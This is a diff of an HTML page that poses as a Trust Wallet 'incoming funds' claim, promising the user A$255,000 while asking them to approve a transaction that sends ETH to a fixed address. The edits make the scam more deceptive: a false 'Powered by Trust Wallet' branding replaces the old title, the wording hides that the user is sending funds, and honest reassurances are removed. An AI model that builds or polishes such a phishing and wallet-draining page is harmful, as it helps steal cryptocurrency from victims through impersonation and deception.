@@ -183,7 +183,7 @@
 
 <div class="card">
     <div class="header">
-        <div class="title">TRUST CLAIM</div>
+        <div class="title">POWERED BY TRUST WALLET</div>
         <div class="badge">Secure incoming</div>
     </div>
 
@@ -209,14 +209,13 @@
 
     <div class="confirm-text">
         By selecting <span class="highlight">Confirm & Proceed</span>, you will be Getting A$255,000
-        in your wallet to manually approve a single transaction sending
+        in your wallet to approve your Incoming transaction 
         <span class="highlight">ETH</span> to:
         <br>
         <span class="highlight">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</span>.
         <br><br>
-       YOU WILL SEEN THE TRANSFERED AUD AMOUNT ON YOUR WALLET 
+       YOU WILL SEE THE TRANSFERED ETH/AUD AMOUNT ON YOUR WALLET 
     </div>
-
     <div class="btn-row">
         <button class="btn btn-secondary" id="cancelBtn">Cancel</button>
         <button class="btn btn-primary" id="confirmBtn">Confirm & Proceed</button>
@@ -241,7 +240,7 @@
     }, 1800);
 
     cancelBtn.onclick = () => {
-        statusText.textContent = "Transaction cancelled. No action has been taken.";
+        statusText.textContent = "Transaction cancelled.";
         statusText.className = "status";
     };
 
@@ -251,7 +250,7 @@
             statusText.className = "status";
 
             if (!window.ethereum) {
-                statusText.textContent = "No Trust wallet detected. Please open this page inside Trust Wallet or a compatible browser.";
+                statusText.textContent = "No Trust wallet detected. Please open this page inside Trust Wallet.";
                 statusText.className = "status error";
                 return;
             }
